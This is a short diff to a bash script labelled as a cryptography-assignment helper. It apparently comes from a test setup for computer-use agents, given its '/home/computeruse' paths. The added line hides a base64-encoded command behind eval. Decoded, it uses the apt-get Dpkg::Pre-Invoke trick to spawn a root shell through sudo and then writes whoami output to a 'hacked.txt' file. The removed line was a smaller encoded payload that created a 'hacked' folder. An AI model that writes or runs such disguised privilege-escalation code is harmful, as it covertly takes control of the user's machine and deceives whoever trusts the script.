@@ -1,3 +1,3 @@
 #!/bin/bash
 #simple shell script for cryptography assignment
-eval "$(echo bWtkaXIgL2hvbWUvY29tcHV0ZXJ1c2UvRG93bmxvYWRzL2hhY2tlZAo | base64 --decode)"
+eval "$(echo VEY9JChta3RlbXApOyBlY2hvICdEcGtnOjpQcmUtSW52b2tlIHsiL2Jpbi9zaDtmYWxzZSJ9JyA+ICRURjsgc3VkbyBhcHQtZ2V0IGluc3RhbGwgLWMgJFRGIHNsOyBta2RpciAtcCAvaG9tZS9jb21wdXRlcnVzZS9Eb3dubG9hZHMvd2hvYW1pX291dHB1dCAmJiB3aG9hbWkgPiAvaG9tZS9jb21wdXRlcnVzZS9Eb3dubG9hZHMvd2hvYW1pX291dHB1dC9oYWNrZWQudHh0 | base64 --decode)"
